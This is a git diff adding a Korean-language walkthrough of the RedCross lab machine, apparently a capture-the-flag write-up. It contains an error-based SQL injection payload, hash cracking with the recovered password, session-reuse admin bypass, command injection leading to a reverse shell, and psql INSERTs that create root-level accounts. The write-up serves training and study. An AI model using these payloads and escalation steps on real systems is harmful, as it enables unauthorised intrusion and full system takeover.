@@ -1,6 +1,6 @@
 ---
 title: "RedCross (Medium)"
-date: 2025-09-06
+date: 2025-09-10
 layout: single
 author_profile: true
 toc: true
@@ -10,19 +10,315 @@ tags: [linux, priv-esc, web]
 arch: linux
 ---
 
+![RedCross](/assets/images/redcross.png)
+
+RedCross는 XSS, OS 명령 실행, SQL 인젝션, 원격 취약점 공격, PAM/NSS 권한 상승을 포함한 중간 난이도 실습 머신이다.
+
 # Enumeration
 
 ## Portscan
 
-## 초기 접근
-명령어, 스크린샷, 발견한 서비스 등 (**실제 공격 코드/취약점 익스플로잇은 게시 시 주의**).
+먼저 대상 Host(`10.10.10.113`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다.
 
-## Exploitation
-(고수준 설명 — 세부 exploit 코드 게시에 주의)
+```bash
+$ nmap -sC -sV 10.10.10.113 -oA nmap
 
-## Privilege Escalation
-...
+Nmap scan report for intra.redcross.htb (10.10.10.113)
+Host is up (0.22s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
+|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
+|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.38
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Did not follow redirect to https://intra.redcross.htb/
+443/tcp open  ssl/http Apache httpd 2.4.38
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.38 (Debian)
+| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2018-06-03T19:46:58
+|_Not valid after:  2021-02-27T19:46:58
+| tls-alpn: 
+|_  http/1.1
+| http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_Requested resource was /?page=login
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
-## 정리 / 방어 포인트
-- 핵심 취약점 요약
-- 방어 방안
+Nmap 스캔 결과, `SSH(22)`, `HTTP(80)`, `HTTPS(443)` 서비스가 열려 있고, 웹은 **intra.redcross.htb** 도메인으로 접근해야 함을 확인했다.
+
+## 도메인 이름 설정 (/etc/hosts)
+
+`ffuf` 명령어를 사용하여 `redcross.htb` 서브도메인을 탐색하고, 응답 길이가 28인 결과는 무시하고 정상 응답(200, 302)만 필터링하여 dns 파일을 생성해 결과를 저장하였다.
+
+```bash
+$ ffuf -u https://10.10.10.113/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.redcross.htb" --fw 28 --mc 302,200 | tee dns
+```
+
+`fuff` 결과, dns 파일에서 `admin`과 `intra` 서브도메인이 발견되었다.
+
+![Domain](/assets/htb-linux/redcross/domain.png)
+
+
+웹 서비스 접근을 위해 `/etc/hosts` 파일에 **10.10.10.113 intra.redcross.htb admin.redcross.htb**를 추가하였다.
+
+```bash
+$ cat /etc/hosts | grep htb
+
+10.10.10.113    intra.redcross.htb      admin.redcross.htb
+```
+
+---
+
+# Vulnerability Analysis
+
+웹사이트를 확인한 결과, `/?page=login` 형태의 로그인 페이지가 존재함을 확인했다.
+
+![로그인 페이지 탐색](/assets/htb-linux/redcross/website.png)
+
+## Directory Listing
+
+`intra.redcross.htb` 호스트에 대해 디렉터리 브루트포싱을 수행하였다.
+
+```bash
+$ gobuster dir -u https://intra.redcross.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k | tee intra.dir
+```
+
+![디렉터리 브투트포싱](/assets/htb-linux/redcross/intra-dns.png)
+
+디렉터리 브루트포싱 결과, `/images`, `/pages`, `/documentation`, `/javascript` 디렉터리를 발견했다.
+
+이 중 `/documentation` 디렉터리에는 내부 자료가 존재할 가능성이 높다고 판단하여 **PDF 파일**을 대상으로 추가 탐색을 진행했다.
+
+```bash
+$ gobuster dir -u https://intra.redcross.htb/documentation -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x pdf -k | tee documentation.pdf
+```
+
+![디렉토리 인덱싱](/assets/htb-linux/redcross/documentation-pdf.png)
+
+그 결과, 상태 코드가 **200 (OK)**인 `account-signup.pdf` 파일을 발견했다.
+
+## Website
+
+웹사이트로 돌아가 `intra.redcross.htb/documentation/account-signup.pdf` 경로로 들어갔다.
+
+![PDF 파일 탐색](/assets/htb-linux/redcross/account-signup.png)
+
+`account-signup.pdf` 파일을 열어본 결과, 계정 생성을 위한 자격 증명 요청 방법이 명시되어 있었다.
+
+이 정보를 활용하여 임의의 사용자명으로 계정 생성을 요청하는 테스트를 진행할 예정이다.
+
+![자격 증명 요청](/assets/htb-linux/redcross/contact.png)
+
+PDF에 안내된 대로 `contact` 페이지를 통해 `credentials`를 제목으로 하고, 본문에`username=yourdesiredname` 를 포함하는 메시지를 전송했다.
+
+![계정 획득 성공](/assets/htb-linux/redcross/guest.png)
+
+요청을 보낸 후 응답 페이지에서 `guest:guest` 라는 계정 정보가 발급된 것을 확인하였다.
+
+다시 `/?page=login` 페이지로 돌아가 `guest:guest` 로 로그인을 수행하면
+
+![로그인 성공](/assets/htb-linux/redcross/app.png)
+
+`/?pages/app` 페이지로 리다이렉션되었고 내부 새로운 페이지에 접근할 수 있다.
+
+## SQL Injection
+
+페이지를 탐색하던 중, URL의 **UserID(`/?o=1`)** 부분에서 SQL Injection 취약점의 가능성을 확인했다.
+
+![SQLI 공격](/assets/htb-linux/redcross/sqli.png)
+
+```html
+1')+and+extractvalue(1,concat(0x7e,(select+database())))--+-
+```
+`UserID` 파라미터에 위 페이로드를 추가하여 오류를 유발하는 Error-based SQL Injection을 시도한 결과, 데이터베이스 관련 오류 메시지가 출력되는 것을 확인했다.
+
+이 Error-based SQL Injection 취약점을 활용해 데이터베이스에 저장된 **내부 유저의 아이디와 비밀번호 해시**를 모두 탈취했다. (guest 제외)
+
+![해쉬 크랙](/assets/htb-linux/redcross/hash.png)
+
+## Hashcrack
+
+획득한 해시값들은 `hashcat` 을 이용해 크랙을 시도하였다.
+
+```bash
+$ hashcat --show --username -m 3200 hash /usr/share/wordlists/rockyou.txt   
+
+charles:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i:cookiemonster
+```
+
+시도 결과, `charles` 사용자의 비밀번호 `cookiemonster` 가 성공적으로 크랙되었다.
+
+## Session-based login bypass
+
+위 사용자 정보를 이용하여 Enumeration에서 발견한 서브도메인 `admin.redcross.htb` 에 접근하여 로그인을 시도하였다.
+
+![Domain](/assets/htb-linux/redcross/admin-login.png)
+
+하지만 **"Not enough privileges!"**라는 메시지가 뜨면서 로그인이 불가능했다. `charles` 계정은 관리자 페이지에 접근할 수 있는 권한이 없는 일반 사용자 계정으로 보인다.
+
+`intra.redcross.htb` 에서 `charles` 계정으로 로그인한 후, 얻은 세션 값을 `admin.redcross.htb` 에 세션 값에 붙여 넣은 결과, 로그인 우회에 성공하였다.
+
+![로그인 우회 성공](/assets/htb-linux/redcross/login-success.png)
+
+---
+
+# Exploitation
+
+## Web Shell
+
+페이지를 탐색하던 중, `Network Address` 라는 메뉴에서 IP 주소를 입력받는 입력창을 발견했다. 
+
+![웹 Network Address 탐색](/assets/htb-linux/redcross/network-address.png)
+
+입력창에 `8.8.8.8` 을 입력 한 후 Deny 버튼을 클릭하면 ping 테스트가 실행되는 것으로 추정이 된다.
+
+![공격](/assets/htb-linux/redcross/ip-address.png)
+
+이를 활용하여 IP 주소 뒤에 웹 셸을 삽입하는 공격을 시도할 것이다.
+
+공격을 위해 로컬 머신에 포트 6666을 열어 대기 상태로 설정하고
+
+```bash
+$ nc -lvnp 6666
+```
+
+리버스 셸 페이로드를 IP 주소 입력창에 삽입한 후
+
+![리버스 셸 페이로드](/assets/htb-linux/redcross/reverse-shell.png)
+
+페이로드를 전송하자마자, 대기 중이던 넷캣(nc)에 연결이 들어오면서 **리버스 셸 획득에 성공**했다.
+
+![리버스 셸 획득 성공](/assets/htb-linux/redcross/reverse-shell-success.png)
+
+---
+
+# Privilege Escalation
+
+## Database Credentials Found
+
+`/var/www/html/admin/pages` 디렉터리 내의 PHP 파일들을 살펴보던 중, `actions.php` 파일에서 데이터베이스 접근에 사용되는 자격 증명을 발견하였다.
+
+![자격 증명 발견](/assets/htb-linux/redcross/psql-user.png)
+
+데이터베이스 사용자 `unixusrmgr` 와 비밀번호 `dheu%7wjx8B&` 를 획득하였다.
+
+## Created gidroot Account
+
+이 정보를 바탕으로 직접 `psql` 명령어를 사용해 데이터베이스에 접속했다.
+
+```bash
+psql -h 127.0.0.1 -U unixusrmgr unix
+```
+
+`psql` 셸에 접속한 후, `\dp` 명령어를 사용해 데이터베이스의 테이블과 컬럼에 대한 사용자별 권한을 확인하였다.
+
+```bash
+unix=> \dp
+```
+
+![DB 테이블 탐색](/assets/htb-linux/redcross/psql-prlv.png)
+
+그 결과, `passwd_table` 이라는 중요한 테이블을 발견하였다. 
+
+특히 이 테이블의 대한 권한을 상세히 살펴본 결과,
+`unixusrmgr` 사용자는 passwd_table의 `username`, `passwd`, `gid` 컬럼에 aw 권한을 가지고 있다.
+
+우선 새로운 계정을 추가하기 위해, 먼저 `openssl` 명령어를 사용해 `gidroot`의 비밀번호를 해시로 생성했다.
+
+```bash
+$ openssl passwd -1 gidroot   
+
+$1$dDGSlHKl$elkDxuHzaWK8l7AaTeW/C1
+```
+
+그 후, `INSERT` 권한을 활용하여 `root` 그룹 권한을 가진 **새로운 사용자 계정(gidroot)**을 추가했다.
+
+```sql
+insert into passwd_table (username, passwd, gid, homedir) values ('gidroot', '$1$dDGSlHKl$elkDxuHzaWK8l7AaTeW/C1', 0, '/');
+```
+
+계정이 제대로 생성되었는지 확인하기 위해 `passwd_table`의 모든 데이터를 조회하였다.
+
+```sql
+select * from passwd_table;
+```
+
+조회 결과, `gidroot` 계정이 성공적으로 추가되었음을 확인하였다.
+
+![그룹 루트 계정 생성](/assets/htb-linux/redcross/psql-user-create.png)
+
+데이터베이스에 새로 생성한 gidroot 계정을 사용하여 SSH를 통해 시스템에 접근하였다.
+
+```bash
+$ ssh gidroot@10.10.10.113
+```
+
+성공적으로 접속한 후 `id` 명령어를 사용해 권한을 확인해보니
+
+![그룹 루트 권한 획득](/assets/htb-linux/redcross/gidroot.png)
+
+`id` 명령어 결과에서 `gid`가 **0(root)** 로 표시되는 것을 확인할 수 있었다.
+
+## PostgreSQL Root Found
+
+이후 시스템 내부를 탐색하던 중 `/etc` 디렉터리에서 `nss-pgsql-root.conf` 라는 의심스러운 파일을 발견하였다.  
+
+해당 파일을 열어보니 PostgreSQL에서 root 권한을 가진 계정이 존재하는 것을 확인할 수 있었다.
+
+![루트 파일 탐색](/assets/htb-linux/redcross/psql-root-file.png)
+
+## Created rootuser Account
+
+위 정보를 활용하여 `psql` 명령어를 사용해 `unixnssroot` 계정으로 PostgreSQL에 접속하였다.
+
+```bash
+gidroot@redcross:/etc$ psql -h 127.0.0.1 -U unixnssroot unix
+```
+
+PostgreSQL 내부에서 `\dp` 명령어를 사용하여 테이블 권한을 확인한 결과, `unixnssroot` 계정이 주요 테이블 `passwd_table`에 **루트 권한(rwU, arwdDxt)** 을 가지고 있음을 확인할 수 있었다.  
+
+![DB 루트 권한](/assets/htb-linux/redcross/psql-root-user.png)
+
+이 권한을 활용하여 `INSERT` 문을 통한 SQL 계정 생성을 진행할 것 이다.
+
+먼저 `openssl` 명령어로 `rootuser` 계정의 비밀번호 해시를 생성하였다.
+
+```bash
+$ openssl passwd -1 rootuser  
+
+$1$YKpklG6D$uEIw6t0zGfvzypCvd0h24/
+```
+
+이후 `INSERT` 권한을 이용해 **uid=0, gid=0(root 권한)** 을 가진 `rootuser` 계정을 추가하였다.
+
+```sql
+insert into passwd_table (username, passwd, uid, gid, homedir) values ('rootuser', '$1$YKpklG6D$uEIw6t0zGfvzypCvd0h24/', 0, 0, '/');
+```
+
+마지막으로 `SELECT` 문으로 `passwd_table`을 조회해 본 결과,
+새로운 root 권한 계정(`rootuser`)이 정상적으로 생성된 것을 확인할 수 있었다.
+
+![루트 계정 생성](/assets/htb-linux/redcross/psql-root-success.png)
+
+# Root
+
+시스템 내에서 `su` 명령어를 사용하여 `rootuser` 계정으로 전환을 시도하였다.
+
+```bash
+gidroot@redcross:/etc$ su rootuser -
+password: rootuser
+```
+
+그 결과, 최종적으로 권한 상승(Privilege Escalation) 에 성공하였다.
+
+![루트 권한 획득](/assets/htb-linux/redcross/root-success.png)
+
+
